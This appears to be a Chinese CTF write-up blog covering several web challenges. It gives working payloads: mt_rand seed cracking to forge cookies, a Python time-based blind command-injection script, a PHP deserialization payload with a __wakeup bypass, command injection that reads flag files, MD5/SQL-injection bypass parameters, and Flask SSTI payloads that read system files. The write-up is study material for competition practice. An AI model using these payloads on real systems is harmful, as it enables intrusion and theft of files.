<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">zif_fileReader</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdi@1</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// r8@2</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// rsi@4</span></span><br><span class="line">  FILE *v4; <span class="comment">// rbx@4</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax@10</span></span><br><span class="line">  __int64 v7; <span class="comment">// [sp+0h] [bp-B8h]@1</span></span><br><span class="line">  __int64 v8; <span class="comment">// [sp+8h] [bp-B0h]@1</span></span><br><span class="line">  <span class="keyword">char</span> filename[<span class="number">16</span>]; <span class="comment">// [sp+10h] [bp-A8h]@2</span></span><br><span class="line">  __m128i v10; <span class="comment">// [sp+20h] [bp-98h]@3</span></span><br><span class="line">  __m128i v11; <span class="comment">// [sp+30h] [bp-88h]@3</span></span><br><span class="line">  __m128i v12; <span class="comment">// [sp+40h] [bp-78h]@3</span></span><br><span class="line">  __m128i v13; <span class="comment">// [sp+50h] [bp-68h]@3</span></span><br><span class="line">  __m128i v14; <span class="comment">// [sp+60h] [bp-58h]@3</span></span><br><span class="line">  __m128i v15; <span class="comment">// [sp+70h] [bp-48h]@3</span></span><br><span class="line">  __m128i v16; <span class="comment">// [sp+80h] [bp-38h]@3</span></span><br><span class="line">  __int64 v17; <span class="comment">// [sp+98h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  v1 = *(_DWORD *)(a1 + <span class="number">44</span>);</span><br><span class="line">  v17 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  v7 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( zend_parse_parameters(v1, (__int64)<span class="string">&quot;s&quot;</span>, (__int64)&amp;v7, (__int64)&amp;v8) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = filename;</span><br><span class="line">    <span class="built_in">memset</span>(filename, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)v8 &lt;= <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v6) = __memcpy_chk((__int64)filename, v7, v8, <span class="number">128L</span>L);</span><br><span class="line">      v2 = v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(__m128i *)filename = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)v7);</span><br><span class="line">      v10 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(v7 + <span class="number">16</span>));</span><br><span class="line">      v11 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(v7 + <span class="number">32</span>));</span><br><span class="line">      v12 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(v7 + <span class="number">48</span>));</span><br><span class="line">      v13 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(v7 + <span class="number">64</span>));</span><br><span class="line">      v14 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(v7 + <span class="number">80</span>));</span><br><span class="line">      v15 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(v7 + <span class="number">96</span>));</span><br><span class="line">      v16 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(v7 + <span class="number">112</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = <span class="string">&quot;rb&quot;</span>;</span><br><span class="line">    v4 = fopen(v2, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( !feof(v4) )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">char</span>)fgetc(v4);</span><br><span class="line">        php_printf((__int64)<span class="string">&quot;%c&quot;</span>, (__int64)v3);</span><br><span class="line">      &#125;</span><br><span class="line">      php_printf((__int64)<span class="string">&quot;\n&quot;</span>, (__int64)v3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      php_printf((__int64)<span class="string">&quot;Failed~&quot;</span>, (__int64)<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v17;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="easyseed"><a href="#easyseed" class="headerlink" title="easyseed"></a><strong>easyseed</strong></h3><ul>
<li><code>http://122.112.252.28:20001/index.bak</code></li>
</ul>
<blockquote>
<p>PHP/5.6.28</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">***************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">$lock = random(<span class="number">6</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;0123456789ABC&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)]; <span class="comment">//mt_rand() 使用 Mersenne Twister 算法返回随机整数。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br><span class="line">*************************</span><br></pre></td></tr></table></figure>

<p>参考:</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/196831">无需暴破还原mt_rand()种子</a></p>
<p><a target="_blank" rel="noopener" href="http://www.yulegeyu.com/2017/05/13/PHPCMS-MT-RAND-SEED-CRACK%E8%87%B4authkey%E6%B3%84%E9%9C%B2%E3%80%82/">http://www.yulegeyu.com/2017/05/13/PHPCMS-MT-RAND-SEED-CRACK%E8%87%B4authkey%E6%B3%84%E9%9C%B2%E3%80%82/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a></p>
<ul>
<li>payload</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$str = <span class="string">&quot;vEUHaY&quot;</span>;</span><br><span class="line">$randStr = <span class="string">&quot;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">   $pos = strpos($randStr,$str[$i]);</span><br><span class="line">   <span class="keyword">echo</span> $pos.<span class="string">&quot; &quot;</span>.$pos.<span class="string">&quot; &quot;</span>.<span class="string">&quot;0 &quot;</span>.(strlen($randStr)<span class="number">-1</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">   <span class="comment">//整理成方便 php_mt_seed 测试的格式</span></span><br><span class="line">  <span class="comment">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span></span><br><span class="line">  <span class="comment">//21 21 0 51 30 30 0 51 46 46 0 51 33 33 0 51 0 0 0 51 50 50 0 51</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>seed</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@iZwz951ls2mad25iuv9mtjZ:~/php_mt_seed-4.0<span class="comment"># ./php_mt_seed `php 1.php`</span></span><br><span class="line">Pattern: EXACT-FROM-52 EXACT-FROM-52 EXACT-FROM-52 EXACT-FROM-52 EXACT-FROM-52 EXACT-FROM-52</span><br><span class="line">Version: 3.0.7 to 5.2.0</span><br><span class="line">Found 0, trying 0xe0000000 - 0xffffffff, speed 120.3 Mseeds/s </span><br><span class="line">Version: 5.2.1+</span><br><span class="line">Found 0, trying 0x00000000 - 0x0fffffff, speed 0.0 Mseeds/s </span><br><span class="line">seed = 0x000af591 = 718225 (PHP 5.2.1 to 7.0.x; HHVM)</span><br><span class="line">Found 1, trying 0xe0000000 - 0xefffffff, speed 14.8 Mseeds/s </span><br><span class="line">seed = 0xeed97ca5 = 4007230629 (PHP 5.2.1 to 7.0.x; HHVM)</span><br><span class="line">Found 2, trying 0xf0000000 - 0xffffffff, speed 14.8 Mseeds/s </span><br><span class="line">Found 2</span><br></pre></td></tr></table></figure>

<p>注意要使用<code>php5.6</code></p>
<ul>
<li>payload</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$seed  = <span class="number">718225</span>;</span><br><span class="line">mt_srand($seed);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)]; <span class="comment">//mt_rand() 使用 Mersenne Twister 算法返回随机整数。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lock = random(<span class="number">6</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line"><span class="comment">//string(6) &quot;vEUHaY&quot;</span></span><br><span class="line"><span class="comment">//string(16) &quot;nRtqGR8mtd9ZOPyI&quot;</span></span><br><span class="line">var_dump($lock,$key);</span><br></pre></td></tr></table></figure>



<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 122.112.252.28:20001</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4231.0 Safari/537.36 Edg/86.0.615.3</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span>: key=nRtqGR8mtd9ZOPyI; lock=vEUHaY</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Thu, 27 Aug 2020 07:30:44 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.23 (Unix)</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.6.28</span><br><span class="line"><span class="attribute">Set-Cookie</span>: lock=vEUHaY</span><br><span class="line"><span class="attribute">Set-Cookie</span>: key=Infer+the+key+from+the+lock</span><br><span class="line"><span class="attribute">Content-Length</span>: 155</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;h1 align=&quot;center&quot;&gt;é¥åå¼éçæ¸¸æ!!!&lt;/h1&gt;&lt;img src=&quot;1.jpeg&quot; style=&quot;margin-left:38%&quot;/&gt;&lt;script&gt;alert(&#x27;flag&#123;6e5b51029a9a9ccd6d6b0f9a1a58c494&#125;&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a><strong>easyweb</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag_format = re.compile(<span class="string">&#x27;flag\\&#123;[0-9a-z]&#123;8&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;12&#125;\\&#125;&#x27;</span>)</span><br><span class="line">all_letter = <span class="string">&#x27;-&#125;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>(<span class="params">command</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(<span class="string">&#x27;http://119.3.37.185/&#x27;</span>, data=&#123;<span class="string">&#x27;cmd&#x27;</span>: command&#125;, timeout=<span class="number">1.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> flag_format.match(flag) == <span class="literal">None</span>:</span><br><span class="line">        staus = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> all_letter:</span><br><span class="line">            payload = <span class="string">&#x27;cat /flag* | grep %s &amp;&amp; sleep 1.8&#x27;</span> % (flag + i)</span><br><span class="line">            print(payload)</span><br><span class="line">            <span class="keyword">if</span> get_flag(payload):</span><br><span class="line">                staus = <span class="number">1</span></span><br><span class="line">                flag += i</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> staus == <span class="number">0</span>:</span><br><span class="line">            flag = flag[<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>from </p>
<p><a target="_blank" rel="noopener" href="https://250.ac.cn/2018/12/18/%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%88%A9%E7%94%A8/#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9C%AA%E8%81%94%E7%BD%91">无回显的命令执行之利用</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8125">https://xz.aliyun.com/t/8125</a></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="第四届强网杯"><a href="#第四届强网杯" class="headerlink" title="第四届强网杯"></a>第四届强网杯</h1><h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><h3 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h3><p>源代码:<a target="_blank" rel="noopener" href="http://112.126.59.156:8080/s/QmfSGNA2JZ7CmK2/download">http://112.126.59.156:8080/s/QmfSGNA2JZ7CmK2/download</a></p>
<p>原题:<a target="_blank" rel="noopener" href="https://ama666.cn/2020/06/25/DASCTF-6%E6%9C%88%E8%B5%9B%E6%80%BB%E7%BB%93/">https://ama666.cn/2020/06/25/DASCTF-6%E6%9C%88%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password&#x3D;&quot;&quot;;S:7:&quot;\0*\0pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;\0*\0\6eame&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;\0*\0\6eame&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;\0*\0\6eame&quot;;s:5:&quot;fe1w0&quot;;&#125;&#125;&#125;;s:8:&quot;\0*\0admin&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>__wakeup</code>绕过 以及 <code>S</code>支持16进制编码就行</p>
</blockquote>
<h3 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/i&quot;</span>, $_GET[<span class="string">&quot;ip&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;ping -c 3 <span class="subst">$_GET</span>[ip]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<ul>
<li>payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.96.23.228:10002&#x2F;?ip&#x3D;|cat f***| base64</span><br></pre></td></tr></table></figure>

<h3 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&quot;hash1&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, $_GET[<span class="string">&quot;hash1&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 1 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 即 $_GET[&quot;hash1&quot;] == hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;hash2&#x27;</span>] === $_GET[<span class="string">&#x27;hash3&#x27;</span>] || md5($_GET[<span class="string">&#x27;hash2&#x27;</span>]) !== md5($_GET[<span class="string">&#x27;hash3&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 2 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM flag WHERE password = &#x27;&quot;</span> . md5($_GET[<span class="string">&quot;hash4&quot;</span>],<span class="literal">true</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.101.177.96&#x2F;?hash1&#x3D;0e251288019&amp;hash2[]&#x3D;1&amp;hash3[]&#x3D;2&amp;hash4&#x3D;ffifdyop</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tqing/p/11852990.html">https://www.cnblogs.com/tqing/p/11852990.html</a></p>
<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>密码<code>123456</code></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c3679f805a0c">https://www.jianshu.com/p/c3679f805a0c</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fe1w0@fe1w0:~$ steghide extract -sf 1.jpg</span><br><span class="line">Enter passphrase: </span><br><span class="line">the file <span class="string">&quot;flag.txt&quot;</span> does already exist. overwrite ? (y/n) </span><br><span class="line"></span><br><span class="line">steghide: did not write to file <span class="string">&quot;flag.txt&quot;</span>.</span><br></pre></td></tr></table></figure>

<h1 id="GACTF"><a href="#GACTF" class="headerlink" title="GACTF"></a>GACTF</h1><h2 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h2><h3 id="simpleflask"><a href="#simpleflask" class="headerlink" title="simpleflask"></a>simpleflask</h3><p><code>http://149.28.80.82:89/</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\WINDOWS\System32&gt; curl.exe -X POST  http://124.70.153.63:80 -d <span class="string">&#x27;name=&#123;&#123;1-1&#125;&#125;&#x27;</span></span><br><span class="line">&lt;h1&gt;hello 0!&lt;h1&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>id </li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__.__builtins__[<span class="string">&quot;open&quot;</span>](<span class="string">&quot;/etc/machine-id&quot;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">hello a8eb6cac33e701ae867269db5ce80e7f !</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__.__builtins__[<span class="string">&quot;open&quot;</span>](<span class="string">&quot;/proc/self/cgroup&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

